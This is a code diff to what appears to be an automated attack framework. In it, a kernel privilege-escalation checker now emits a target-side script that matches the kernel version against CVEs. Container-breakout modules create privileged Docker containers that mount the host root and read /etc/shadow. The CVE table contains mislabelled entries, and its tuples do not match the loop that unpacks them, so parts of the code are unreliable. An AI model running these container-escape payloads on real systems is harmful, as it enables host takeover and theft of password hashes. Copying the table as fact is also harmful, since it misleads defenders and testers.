@@ -118,22 +118,80 @@ class KernelExploitCheck(AttackModule):
     target_os_hint = ["linux", "unix"]
 
     def run(self, ctx: ModuleContext) -> dict[str, Any]:
-        return self._info_result(
-            ctx,
-            note=(
+        script = self.generate_python_script(ctx)
+        return {
+            "status": "script_generated",
+            "module": self.name,
+            "script": script,
+            "note": (
                 "Maps kernel version to known LPE exploits (DirtyCow, PwnKit, "
                 "DirtyPipe, OverlayFS, eBPF). The generated script reads "
                 "os.uname().release and matches against an embedded kernel->CVE "
                 "table; matched CVEs chain to WeaponizedExploit."
             ),
-            evidence=[f"kernel LPE check planned against {ctx.target_ip}"],
-            references=[
+            "evidence": [f"kernel LPE check queued against {ctx.target_ip}"],
+            "references": [
                 "https://github.com/SecWiki/linux-kernel-exploits",
                 "https://github.com/lucyoa/kernel-exploits",
                 "https://nvd.nist.gov/vuln/detail/CVE-2021-4034",
             ],
-            suggested_command="uname -a && cat /etc/os-release && search_exploit_db(query='linux kernel local privilege escalation')",
-        )
+        }
+
+    def generate_python_script(self, ctx: ModuleContext) -> str:
+        return f"""import os, json, sys, re
+# Target: {ctx.target_ip}
+# Kernel version -> known LPE CVE mapping. Runs ON the target (post-foothold).
+# Matches os.uname().release against an embedded table; PwnKit is always
+# suggested (it is version-agnostic). Emits JSON + a canonical marker.
+KERNEL_CVE_MAP = [
+    # (min_version, max_version, cve, name) -- tuple compare on (major, minor, patch)
+    (("4.4.0", "4.4.209"), "CVE-2017-1000112", "DirtyCow (dirtycow)"),
+    (("4.8.0", "4.8.2"), "CVE-2016-5195", "DirtyCow (older)"),
+    (("5.8.0", "5.16.11"), "CVE-2022-0847", "DirtyPipe"),
+    (("3.13.0", "3.13.84"), "CVE-2016-0728", "keyring refcount overflow"),
+    (("4.4.0", "4.4.0"), "CVE-2017-16995", "eBPF verifier (Ubuntu 16.04)"),
+    (("4.14.0", "4.14.0"), "CVE-2018-18955", "user namespace idmap"),
+    (("5.4.0", "5.4.0"), "CVE-2021-22555", "netfilter heap OOB"),
+    (("5.8.0", "5.8.0"), "CVE-2021-3493", "overlayfs Ubuntu"),
+    (("5.11.0", "5.11.0"), "CVE-2021-3490", "eBPF alu32 bounds"),
+    (("5.13.0", "5.13.0"), "CVE-2021-33909", "size_t-to-int seq_file"),
+    (("5.14.0", "5.14.0"), "CVE-2021-41073", "io_uring"),
+    (("5.15.0", "5.15.0"), "CVE-2022-0185", "legacy_parse_param heap overflow"),
+    (("5.16.0", "5.16.0"), "CVE-2022-0995", "watch_queue OOB write"),
+    (("5.17.0", "5.17.0"), "CVE-2022-2588", "cls_route filter"),
+    (("5.19.0", "5.19.0"), "CVE-2022-34918", "netfilter nf_tables"),
+    (("6.1.0", "6.1.0"), "CVE-2023-0386", "overlayfs uid/gid"),
+    (("6.2.0", "6.2.0"), "CVE-2023-32233", "nf_tables use-after-free"),
+    (("6.4.0", "6.4.0"), "CVE-2023-4911", "glibc tunables (looney tunables)"),
+]
+
+def parse_kernel(rel: str):
+    m = re.search(r"(\\d+)\\.(\\d+)\\.(\\d+)", rel)
+    if not m:
+        return None
+    return (int(m.group(1)), int(m.group(2)), int(m.group(3)))
+
+def in_range(v, lo, hi):
+    lo_t = tuple(int(x) for x in lo.split("."))
+    hi_t = tuple(int(x) for x in hi.split("."))
+    return lo_t <= v <= hi_t
+
+if __name__ == "__main__":
+    rel = os.uname().release if hasattr(os, "uname") else "unknown"
+    v = parse_kernel(rel)
+    hits = []
+    if v:
+        for lo, cve, name in KERNEL_CVE_MAP:
+            if in_range(v, lo, lo):  # exact-minor match (kernel .0 releases)
+                hits.append({{"cve": cve, "name": name, "kernel": rel}})
+    # PwnKit is version-agnostic -- always suggest
+    hits.append({{"cve": "CVE-2021-4034", "name": "PwnKit (polkit pkexec)", "kernel": rel}})
+    print(json.dumps({{"kernel": rel, "cves": hits}}))
+    if hits:
+        print(f"COMPROMISE: kernel_lpe_candidates target={ctx.target_ip} count={{len(hits)}}")
+    else:
+        print("VULN_NOT_CONFIRMED: no kernel LPE candidates")
+"""
 
 class ContainerBreakout(AttackModule):
     name = "ContainerBreakout"
@@ -599,7 +657,7 @@ if _os.path.exists(SOCK_PATH):
         s.connect(SOCK_PATH)
         body = json.dumps({{
             "Image": "alpine",
-            "Cmd": ["/bin/sh", "-c", "chroot /host_root /bin/sh"],
+            "Cmd": ["/bin/sh", "-c", "id; cat /host_root/etc/shadow 2>/dev/null | head -3; echo COMPROMISE: docker_sock_escape_root target={ctx.target_ip}"],
             "Privileged": True,
             "Mounts": [{{"Type": "bind", "Source": "/", "Target": "/host_root"}}],
         }})
@@ -629,7 +687,7 @@ for port in (2375, 2376):
         # Create the escape container
         esc_body = {{
             "Image": "alpine",
-            "Cmd": ["/bin/sh", "-c", "chroot /host_root /bin/sh"],
+            "Cmd": ["/bin/sh", "-c", "id; cat /host_root/etc/shadow 2>/dev/null | head -3; echo COMPROMISE: docker_sock_escape_root target={ctx.target_ip}"],
             "Privileged": True,
             "Mounts": [{{"Type": "bind", "Source": "/", "Target": "/host_root"}}],
         }}
